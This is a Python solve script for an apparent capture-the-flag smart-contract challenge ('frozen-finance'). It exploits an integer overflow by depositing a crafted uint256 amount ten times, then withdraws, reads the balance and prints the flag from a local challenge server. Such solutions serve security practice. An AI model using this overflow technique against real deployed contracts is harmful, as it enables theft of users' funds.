import asyncio
import logging
from common import utils

logger = utils.setup_logger("frozen-finance")

async def main(hostname='127.0.0.1', port=31337):
    ctx = await utils.get_context(hostname, port)
    contract = ctx["contract"]
    acc_client = ctx["acc_client"]

    # attack
    logger.info("Start deposit loop")
    for i in range(0, 10):
        logger.debug(f"deposit {i}")
        invocation = await contract.functions["deposit"].invoke(amount={"low": 2<<128 - 1, "high":0}, max_fee=int(4e16))
        await invocation.wait_for_acceptance()
    logger.info("Call withdraw")
    invocation = await contract.functions["withdraw"].invoke(max_fee=int(4e16))
    await invocation.wait_for_acceptance()
    balance = (await contract.functions["readBalance"].call()).balance
    logger.info(f"Balance: {balance}")
    flag = utils.get_flag(hostname, port)
    logger.info(f"Flag: {flag}")
    return

asyncio.run(main())
